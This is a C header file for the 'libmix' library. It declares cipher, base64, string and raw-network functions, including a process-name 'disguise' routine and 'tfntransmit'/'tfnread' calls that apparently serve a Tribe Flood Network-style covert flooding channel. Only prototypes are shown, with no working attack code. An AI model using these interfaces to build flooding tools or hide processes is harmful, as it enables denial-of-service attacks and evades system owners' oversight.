#ifndef MIX_H
#define MIX_H

#ifndef __cplusplus
#define NEW(a,b) (a *)malloc(b)
#define DELETE(n) free(n)
#else
#define NEW(a,b) new a[b]
#define DELETE(n) delete n
#endif

#include "aes.h"
#include "misc.h"
#include "net.h"

#define libmix_version "v1.22"

/* advanced encryption standard interface */

#define CAST256         0x01	/* medium speed, big keyspace */
#define MARS            0x02	/* fast speed, medium keyspace */
#define SAFERP          0x03	/* slow speed, extremely big keyspace */
#define TWOFISH         0x04	/* fast speed, medium keyspace */
#define RIJNDAEL        0x05	/* medium-fast speed, medium-big keyspace */

extern short alg;		/* algorithm selector */
extern short aes_binary;	/* to disable base64 encoding */

u4byte *aes_key (const char *);	/* set a key */
u1byte *aes_encrypt (const u1byte * in, int *);		/* return encrypted data */
u1byte *aes_decrypt (const u1byte *, int);	/* return decrypted data */
u1byte *aes_hash (const s1byte *);	/* return AES digest */
s1byte *base64_in (const u1byte *, int);	/* return base64'd data */
u1byte *base64_out (const s1byte *, int);	/* return un-base64'd data */

/* miscellaneous functions interface */

int exclude_parse(FILE *);	/* parse line in CIDR notation */
void exclude_list(void);	/* dump exclude database to stdout */
int excluded(unsigned int addr);/* check address against database */
void exclude_free(void);	/* free exclude database */
long getrandom (int, int);	/* return random number between arg1 and arg2 */
#ifndef __cplusplus
void sighandler (void *);	/* install sighandler for common interrupt events */
#endif
void strchop (char *);		/* cut string at first newline with \0 */
void strlower (char *);		/* convert all uppercase alpha to lowercase alpha */
void strnsubst (char *, char, int);	/* substitute \0's in a string */
char *strscpy (char *, char *, char *, char);	/* separate a string */
void ioterm (int, int, int);	/* 3rd variable selects encryption */
int pattern (char *, char **);	/* list should always have 2 trailing NULLs */
void log (char *, char *,...);	/* try logging arg2-N into file arg1 */
void fatal (char *,...);	/* print error and die */
void disguise (char *, int, char **);	/* disguise process name */
int isactive (char *);
char * nstrdup (const char *);
int sexec(char *path, char *newpath, char *arg0, char *arg1, char *arg2, char *arg3);
int lm_scan_run (FILE *, lm_callback, int);

/* network functions interface */

int isip (char *);
unsigned long resolve (char *);
char *lm_ntoa(unsigned int, char *);
unsigned int lm_addr(char *);
/* ntoa() is depreceated */
char *ntoa (unsigned int);
unsigned short sum (unsigned short *, int);
void tcpsum (char *, struct lmip *, struct lmtcp *, int);
int incip (char *);
int decip (char *);
int rawsock (int);
int psock (void);
unsigned int inet_gethostaddr (void);
unsigned int inet_local (void);
void ethsrc (struct eth *eh, char *addr);
void ethdst (struct eth *eh, char *addr);
void tfntransmit (unsigned long, unsigned long, int, char *);
char *tfnread (int, int, int);	/* i, u, t */
char *tfnread2(int, int, int, struct timeval);

#endif
